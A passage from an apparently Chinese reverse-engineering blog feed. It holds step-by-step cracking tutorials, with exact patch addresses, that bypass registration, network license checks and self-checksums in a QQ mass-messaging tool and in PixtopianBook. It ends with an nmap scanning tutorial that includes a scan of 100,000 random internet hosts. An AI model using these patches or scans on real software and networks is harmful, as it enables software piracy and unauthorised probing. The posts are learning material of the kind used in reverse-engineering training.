href="https://i.loli.net/2018/07/14/5b49f5bcc1ebd.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5bcc1ebd.jpg" class="lazyload"></a><br>二、破解自动更新及网络验证</p><p>因近期新版本会自动进行更新，所以先使用网络工具Smsniff检测自动更新等信息。</p><p>先运行smsniff，启动抓包功能，然后运行主程序 qqqf.exe </p><p>程序运行起来后，停止抓包，得到如下结果<br>      <a href="https://i.loli.net/2018/07/14/5b49f5bce409f.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5bce409f.jpg" class="lazyload"></a><br>这里发现程序启动后会有两次http访问获取，地址分别为：</p><pre><code>http://www.hd466.com/reg/gm2.txthttp://www.hd466.com/update/02.txt</code></pre><p>打开OD，载入程序后中文搜索，搜索ASCII，查找 reg/gm2.txt</p><p>在代码首下断点后运行程序，断点后单步跟入观察，首先我们发现<br>      <a href="https://i.loli.net/2018/07/14/5b49f5bd11807.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5bd11807.jpg" class="lazyload"></a><br>从代码可以分析得到 先从 0x590FD0 地址取出 0x5950CC 我们第一步得到的注册码验证地址，然后进行比较</p><p>那么我们查找此地址所有常量，下断点<br>      <a href="https://i.loli.net/2018/07/14/5b49f5bd76196.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5bd76196.jpg" class="lazyload"></a><br>逐个跟入地址进行分析</p><p>第1处 00552F9A 取出后直接赋值 1 ，所以不做修改</p><p>第2处 00553240 取出后直接赋值 0 ，果断改为 1 此处包含注册码已经作废，虽然无用，但也修改下吧</p><p>第3处 0055467B 取出后直接赋值 0 ，果断改为 1</p><p>第4处 005546A4 取出后直接赋值 1 ，所以不做修改</p><p>第5处 00554712 取出后直接赋值 0 ，果断改为 1</p><p>第6处 00554C49 取出后进比较，分析此代码段发现 “正在验证，验证失败”等字样，</p><p>竟然和入门教学培训大神小生我怕怕讲解过验证时一样的代码段</p><p>于是果断找到段首，直接 retn 所以第6处代码不做修改<br>      <a href="https://i.loli.net/2018/07/14/5b49f5bd88852.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5bd88852.jpg" class="lazyload"></a></p><p>第7处 00554E04 取出后直接赋值 0 ，果断改为 1  （此代码为验证失败后赋值）</p><p>第8处 00576171 取出后进行比较，出现检查新版本字样，为防止意外更新，我们进行处理下 强行NOP掉更新，同时强行再赋值 1<br>      <a href="https://i.loli.net/2018/07/14/5b49f5bd9c5c8.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5bd9c5c8.jpg" class="lazyload"></a></p><p>这样处理只是为了安全起见，强行改为1也是为了加强一下保险，哈哈</p><p>第9处 00576E5C 取出后进比较，查看下面代码，初步不做修改</p><p>第10处 00579359 取出后进比较，查看下面代码，初步不做修改</p><p>第11处 0057EEC3 取出后进比较，查看下面代码，初步不做修改</p><p>第12处 0057EEF0 取出后进行判断，强行改代码为 mov byte ptr ds:[eax],0x1</p><p>第13处 0057F543 取出后进行比较 程序运行后发现，此处下面的 CALL 为检测注册码段，</p><p>我们将 call 0057F46C 和 test al,al 直接NOP掉，同时将下方的JNZ直接改为JMP<br>      <a href="https://i.loli.net/2018/07/14/5b49f5bdbff02.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5bdbff02.jpg" class="lazyload"></a><br>第14处 00580AE5 发现将地址传给了EBX 于是向下查看代码段，发现两次设置EBX的值，果断将 CMP 和 SETE 两行NOP<br>      <a href="https://i.loli.net/2018/07/14/5b49f5bdd52b1.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5bdd52b1.jpg" class="lazyload"></a>)<a href="https://i.loli.net/2018/07/14/5b49f59ea3aa2.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f59ea3aa2.jpg" class="lazyload"></a></p><p>注：后期跟踪发现，此两处是对注册码位数进行比较，是12位则设置为1，否则为0</p><p>至此，14处地址全修改完毕，保存文件！</p><p>注：后来分析发现，gm2.txt 为一加密文件，程序获取后进行解密，得到一系列网址</p><p>既然我们直接把第一步验证给过掉了，那些也就不存在自动更新了。</p><p>gm2.txt 解密后内容应该为：</p><pre><code>http://www.hd466.com/check.cgi/Check|http://www.hd466.com..http://www.8222.com/reg/|http://www.8222.com..http://s.hdrj.cn/reg/| http://s.hdrj.cn..http://www.h8855.com/reg/|http://www.h8855.com..http://s.8222.com/reg/|http://s.8222.com</code></pre><p>重新打开 smsniff 抓包，发现再运行程序，已经不再连接网络。</p><p>重新OD载入，运行程序，点击注册按钮，我们会发现 程序显示为 “已注册版本” 程序状态栏也显示 “已注册！”<br>      <a href="https://i.loli.net/2018/07/14/5b49f59ec3e33.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f59ec3e33.jpg" class="lazyload"></a><br>三、破解注册窗口输入注册码点确定后网络验证注册码</p><p>OD运行脚本 各语言按钮事件 “Delphi &amp; VB事件断点查找脚本.osc”</p><p>运行程序，进入注册窗口，输入12位数字，点击确定后OD中断在 00556054</p><p>单步跟入会发现连接网址</p><pre><code>http://www.hd466.com/check.dll?id=0258536384&amp;sn=123654789012</code></pre><p>进行验证</p><p>通过网站返回信息进行验证。<br>    <a href="https://i.loli.net/2018/07/14/5b49f59ee9e6c.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f59ee9e6c.jpg" class="lazyload"></a></p><p>通过分析可以确定，上图中标注的行为进行网络验证行，跟随进入后发现有多处调用，直接 retn 掉</p><p>运行程序后 再点注册确定按钮，出现提示说明程序完全正常，点确定后会重启程序，不知道正常注册后会不会自动重启程序。<br>      <a href="https://i.loli.net/2018/07/14/5b49f59f1891d.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f59f1891d.jpg" class="lazyload"></a><br>四、破解程序自校验</p><p>通过教程我们知道，程序有自校验功能，如果不修复的话，插入一些功能会出现乱码</p><p>OD运行脚本 各语言按钮事件 “Delphi &amp; VB事件断点查找脚本.osc”    </p><p>运行程序，需要插入个随机数字 00582BFC 程序执行此处代码段</p><p>单步进入，跟踪到执行 Desklog.dll 代码段<br>      <a href="https://i.loli.net/2018/07/14/5b49f59f3a981.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f59f3a981.jpg" class="lazyload"></a><br>继续跟入，找到自校验代码段<br>      <a href="https://i.loli.net/2018/07/14/5b49f59f4ec23.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f59f4ec23.jpg" class="lazyload"></a><br>跟入找到获取自身验证码段 004B46D6<br>      <a href="https://i.loli.net/2018/07/14/5b49f59f61d63.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f59f61d63.jpg" class="lazyload"></a><br>新开OD，载入原版程序，运行程序，在004B46D6处设置断点，然后插入一次随机数字</p><p>程序断下来后，数据跟随，得到数据：0D 74 66 3D 3C 47 B4 95 E3 E6 19 97 85 8E 4A 84 </p><p>回到OD修改程序处，反复运行程序跟踪数据，发现 当操作插入随机数字或字母等信息时，EBX值为10</p><p>所以跳到新区段处，修改代码对写入原版本校验数据：<br>      <a href="https://i.loli.net/2018/07/14/5b49f59f82c8d.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f59f82c8d.jpg" class="lazyload"></a><br>      <a href="https://i.loli.net/2018/07/14/5b49f59fa45a7.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f59fa45a7.jpg" class="lazyload"></a><br>至此破解工作已经全部完成，打开QQ，发送信息测试一切正常。</p><p>五、其他修改</p><pre><code>修改注册窗口，修改程序标题，修改部分按钮无效。</code></pre>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;吾爱破解培训第四课：击破程序最坚固的堡垒–实战去程序自校验&quot;&gt;&lt;a href=&quot;#吾爱破解培训第四课：击破程序最坚固的堡垒–实战去程序自校验&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="吾爱破解培训" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="脱壳，自校验" scheme="https://kabeor.github.io/tags/%E8%84%B1%E5%A3%B3%EF%BC%8C%E8%87%AA%E6%A0%A1%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>破解PixtopianBook软件功能限制</title>
    <link href="https://kabeor.github.io/%E7%A0%B4%E8%A7%A3PixtopianBook%E8%BD%AF%E4%BB%B6%E5%8A%9F%E8%83%BD%E9%99%90%E5%88%B6/"/>
    <id>https://kabeor.github.io/%E7%A0%B4%E8%A7%A3PixtopianBook%E8%BD%AF%E4%BB%B6%E5%8A%9F%E8%83%BD%E9%99%90%E5%88%B6/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:34:57.100Z</updated>
    
    <content type="html"><![CDATA[<h1 id="破解PixtopianBook软件功能限制"><a href="#破解PixtopianBook软件功能限制" class="headerlink" title="破解PixtopianBook软件功能限制"></a>破解PixtopianBook软件功能限制</h1><p>安装软件</p><p>PEID看一下发现无壳，VC++6.0编译<br><a href="https://i.loli.net/2018/07/14/5b49d5a56c56f.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49d5a56c56f.jpg" class="lazyload"></a></p><p>打开软件，尝试功能</p><blockquote><p>1.当我们选择Add Group，提示没有注册只能创建3个Group<br><a href="https://i.loli.net/2018/07/14/5b49d5a62ceb9.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49d5a62ceb9.jpg" class="lazyload"></a></p></blockquote><p>拖进OD,运行<br>因为未知原因，ALT+F9返回到用户后程序卡死，于是选择ctrl+G搜索MessageBoxA/W，F2下断点</p><p>程序跑起来，让程序弹出这个消息框，此时触发断点，反汇编窗口跟随<br><a href="https://i.loli.net/2018/07/14/5b49d5a653b84.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49d5a653b84.jpg" class="lazyload"></a></p><p>找到了这个API</p><p>断点下到下面的retn，F9运行到断点，F8单步运行一次<br><a href="https://i.loli.net/2018/07/14/5b49d5a67a6fd.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49d5a67a6fd.jpg" class="lazyload"></a></p><p>分析</p><p>1.这个Call就是我们刚才进入的Call，加入我们能跳过这个call，就能避免跳出消息框。</p><p>2.查看这个ascii码，正是消息框的标题和内容，在这里被压入栈，等待调用。</p><p>3.这里有一个cmp，比较eax与3大小（即Group是否等于3），如果小于就跳转到（JL）00408B34，如果已经有3个Group了，就执行call弹出未注册消息框。</p><p>所以我们需要强制跳转</p><p>jl改为jmp即可，复制到可执行文件</p><blockquote><p>2.默认未注册用户只能添加四个联系人<br><a href="https://i.loli.net/2018/07/14/5b49d5a69e301.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49d5a69e301.jpg" class="lazyload"></a></p></blockquote><p>方法同上</p><blockquote><p>更改版本信息</p></blockquote><p><a href="https://i.loli.net/2018/07/14/5b49d5a6c27ae.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49d5a6c27ae.jpg" class="lazyload"></a></p><p>标题，版本文字在代码区是找不到的，我们直接在内存(快捷栏 M)中找<br><a href="https://i.loli.net/2018/07/14/5b49d5a6e6f64.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49d5a6e6f64.jpg" class="lazyload"></a></p><p>记录地址004D4830，dump跳转到004D4830（ctrl+G）</p><p>数据框中二进制编辑为自己想要的字符即可</p><blockquote><p>自定义标题，更改提示注册文字</p></blockquote><p>同上，搜索内存</p><blockquote><p>修改欢迎信息</p></blockquote><p>搜索可知文字在0048F974，dump跳转<br><a href="https://i.loli.net/2018/07/14/5b49d5a71891f.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49d5a71891f.jpg" class="lazyload"></a></p><p>我们需要知道程序哪一段调用了这段字符串。</p><p>我们右键选择查找参考（Ctrl+R）<br>找到一处引用，我们双击进入<br><a href="https://i.loli.net/2018/07/14/5b49d5a732ced.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49d5a732ced.jpg" class="lazyload"></a></p><p>来到如图所示的代码位置<br><a href="https://i.loli.net/2018/07/14/5b49d5a75e803.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49d5a75e803.jpg" class="lazyload"></a></p><p>发现上面有一处cmp和jnz（cmp与jnz组合代表：如果不相等，则跳转），如果ebp等于907，则将这串字符压入栈（可以猜测，907代表未注册），我们根据跳转向上翻<br><a href="https://i.loli.net/2018/07/14/5b49d5bc3cceb.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49d5bc3cceb.jpg" class="lazyload"></a><br>又有一处cmp和jnz，意思是如果ebp不等于906，就要跳转回0040C22F处（可以猜测，906代表注册过）</p><p>直接在0040C235的jnz处进行强制跳转，让其不会将这串字符压入栈</p><p>保存修改。</p><p>就完成了。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;破解PixtopianBook软件功能限制&quot;&gt;&lt;a href=&quot;#破解PixtopianBook软件功能限制&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="FreeBuf" scheme="https://kabeor.github.io/tags/FreeBuf/"/>
    
    <category term="破解" scheme="https://kabeor.github.io/tags/%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>逆向的地位作用</title>
    <link href="https://kabeor.github.io/%E9%80%86%E5%90%91%E7%9A%84%E5%9C%B0%E4%BD%8D%E4%BD%9C%E7%94%A8/"/>
    <id>https://kabeor.github.io/%E9%80%86%E5%90%91%E7%9A%84%E5%9C%B0%E4%BD%8D%E4%BD%9C%E7%94%A8/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:33:54.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向的地位作用"><a href="#逆向的地位作用" class="headerlink" title="逆向的地位作用"></a>逆向的地位作用</h1><p><a href="https://i.loli.net/2018/07/14/5b49d4db33ae2.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d4db33ae2.jpg" class="lazyload"></a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;逆向的地位作用&quot;&gt;&lt;a href=&quot;#逆向的地位作用&quot; class=&quot;headerlink&quot; title=&quot;逆向的地位作用&quot;&gt;&lt;/a&gt;逆向的地位作用&lt;/h1&gt;&lt;p&gt;&lt;a</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/i%E6%98%A5%E7%A7%8B/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋" scheme="https://kabeor.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
  </entry>
  
  <entry>
    <title>逆向的基础和入门</title>
    <link href="https://kabeor.github.io/%E9%80%86%E5%90%91%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E5%85%A5%E9%97%A8/"/>
    <id>https://kabeor.github.io/%E9%80%86%E5%90%91%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E5%85%A5%E9%97%A8/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:34:03.502Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向的基础和入门"><a href="#逆向的基础和入门" class="headerlink" title="逆向的基础和入门"></a>逆向的基础和入门</h1><p><a href="https://i.loli.net/2018/07/14/5b49d552b4f94.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d552b4f94.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d552db7c4.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d552db7c4.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d5530cfe4.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d5530cfe4.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d55334e63.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d55334e63.jpg" class="lazyload"></a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;逆向的基础和入门&quot;&gt;&lt;a href=&quot;#逆向的基础和入门&quot; class=&quot;headerlink&quot; title=&quot;逆向的基础和入门&quot;&gt;&lt;/a&gt;逆向的基础和入门&lt;/h1&gt;&lt;p&gt;&lt;a</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/i%E6%98%A5%E7%A7%8B/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋" scheme="https://kabeor.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
  </entry>
  
  <entry>
    <title>逆向的定义和核心</title>
    <link href="https://kabeor.github.io/%E9%80%86%E5%90%91%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E6%A0%B8%E5%BF%83/"/>
    <id>https://kabeor.github.io/%E9%80%86%E5%90%91%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E6%A0%B8%E5%BF%83/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:33:59.920Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向的定义和核心"><a href="#逆向的定义和核心" class="headerlink" title="逆向的定义和核心"></a>逆向的定义和核心</h1><p><a href="https://i.loli.net/2018/07/14/5b49d50101064.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d50101064.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d50126ac9.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d50126ac9.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d5014bb4c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d5014bb4c.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d5016fd69.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d5016fd69.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d50195bb3.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d50195bb3.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d501bc366.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d501bc366.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d501e3796.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d501e3796.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d50215bfa.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d50215bfa.jpg" class="lazyload"></a>!</p><p><a href="https://i.loli.net/2018/07/14/5b49d5023a801.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d5023a801.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d50263bd4.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d50263bd4.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d52d1742c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d52d1742c.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d52d3cc68.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d52d3cc68.jpg" class="lazyload"></a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;逆向的定义和核心&quot;&gt;&lt;a href=&quot;#逆向的定义和核心&quot; class=&quot;headerlink&quot; title=&quot;逆向的定义和核心&quot;&gt;&lt;/a&gt;逆向的定义和核心&lt;/h1&gt;&lt;p&gt;&lt;a</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/i%E6%98%A5%E7%A7%8B/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋" scheme="https://kabeor.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
  </entry>
  
  <entry>
    <title>逆向的难点、如何进阶和逆向其他题型</title>
    <link href="https://kabeor.github.io/%E9%80%86%E5%90%91%E7%9A%84%E9%9A%BE%E7%82%B9%E3%80%81%E5%A6%82%E4%BD%95%E8%BF%9B%E9%98%B6%E5%92%8C%E9%80%86%E5%90%91%E5%85%B6%E4%BB%96%E9%A2%98%E5%9E%8B/"/>
    <id>https://kabeor.github.io/%E9%80%86%E5%90%91%E7%9A%84%E9%9A%BE%E7%82%B9%E3%80%81%E5%A6%82%E4%BD%95%E8%BF%9B%E9%98%B6%E5%92%8C%E9%80%86%E5%90%91%E5%85%B6%E4%BB%96%E9%A2%98%E5%9E%8B/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:34:10.078Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向的难点、如何进阶和逆向其他题型"><a href="#逆向的难点、如何进阶和逆向其他题型" class="headerlink" title="逆向的难点、如何进阶和逆向其他题型"></a>逆向的难点、如何进阶和逆向其他题型</h1><p><a href="https://i.loli.net/2018/07/14/5b49d5799e7f8.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d5799e7f8.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d579c3cb7.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d579c3cb7.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d579ea235.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d579ea235.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d57a18654.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d57a18654.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/14/5b49d57a2dff1.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49d57a2dff1.jpg" class="lazyload"></a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;逆向的难点、如何进阶和逆向其他题型&quot;&gt;&lt;a href=&quot;#逆向的难点、如何进阶和逆向其他题型&quot; class=&quot;headerlink&quot; title=&quot;逆向的难点、如何进阶和逆向其他题型&quot;&gt;&lt;/a&gt;逆向的难点、如何进阶和逆向其他题型&lt;/h1&gt;&lt;p&gt;&lt;a</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/i%E6%98%A5%E7%A7%8B/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋" scheme="https://kabeor.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
  </entry>
  
  <entry>
    <title>Linux环境下nmap的基本操作及端口扫描</title>
    <link href="https://kabeor.github.io/Linux%E7%8E%AF%E5%A2%83%E4%B8%8Bnmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E5%8F%8A%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
    <id>https://kabeor.github.io/Linux%E7%8E%AF%E5%A2%83%E4%B8%8Bnmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E5%8F%8A%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</id>
    <published>2018-03-10T16:00:00.000Z</published>
    <updated>2020-05-03T04:38:28.295Z</updated>
    
    <content type="html"><![CDATA[<p>#Linux环境下nmap的基本操作及端口扫描<br>##1.nmap基本操作</p><blockquote><p>nmap简介</p></blockquote><p>NMap，也就是Network Mapper，最早是Linux下的网络扫描和嗅探工具包。</p><blockquote><p>基本功能</p></blockquote><p>1  探测一组主机是否在线<br>2  扫描主机端口<br>3  推断主机所用操作系统</p><blockquote><p>基本指令</p></blockquote><p>假设所有主机都在192.168.1.0至255上</p><p>进行ping扫描，打印出对扫描做出响应的主机,不做进一步测试(如端口扫描或者操作系统探测)：</p><pre><code>nmap -sP 192.168.1.0/24</code></pre><p>仅列出指定网络上的每台主机，不发送任何报文到目标主机：</p><pre><code>nmap -sL 192.168.1.0/24</code></pre><p>探测目标主机开放的端口，可以指定一个以逗号分隔的端口列表(如-PS22，23，25，80)：</p><pre><code>nmap -PS 192.168.1.234</code></pre><p>使用UDP ping探测主机：</p><pre><code>nmap -PU 192.168.1.0/24</code></pre><p>使用频率最高的扫描选项：SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快：</p><pre><code>nmap -sS 192.168.1.0/24</code></pre><p>当SYN扫描不能用时，TCP Connect()扫描就是默认的TCP扫描：</p><pre><code>nmap -sT 192.168.1.0/24</code></pre><p>UDP扫描用-sU选项,UDP扫描发送空的(没有数据)UDP报头到每个目标端口:</p><pre><code>nmap -sU 192.168.1.0/24</code></pre><p>确定目标机支持哪些IP协议 (TCP，ICMP，IGMP等):</p><pre><code>nmap -sO 192.168.1.19</code></pre><p>探测目标主机的操作系统：</p><pre><code>nmap -O 192.168.1.19nmap -A 192.168.1.19</code></pre><p>扫描主机scanme中 所有的保留TCP端口。选项-v启用细节模式。</p><pre><code>nmap -sS -O scanme./24</code></pre><p>进行秘密SYN扫描，对象为主机Saznme所在的“C类”网段 的255台主机。同时尝试确定每台工作主机的操作系统类型。因为进行SYN扫描和操作系统检测，这个扫描需要有根权限。</p><pre><code>nmap -sV -p 22，53，110，143，4564 198.116.0-255.1-127</code></pre><p>进行主机列举和TCP扫描，对象为B类188.116网段中255个8位子网。这 个测试用于确定系统是否运行了sshd、DNS、imapd或4564端口。如果这些端口打开，将使用版本检测来确定哪种应用在运行。</p><pre><code>nmap -v -iR 100000 -P0 -p 80</code></pre><p>随机选择100000台主机扫描是否运行Web服务器(80端口)。由起始阶段 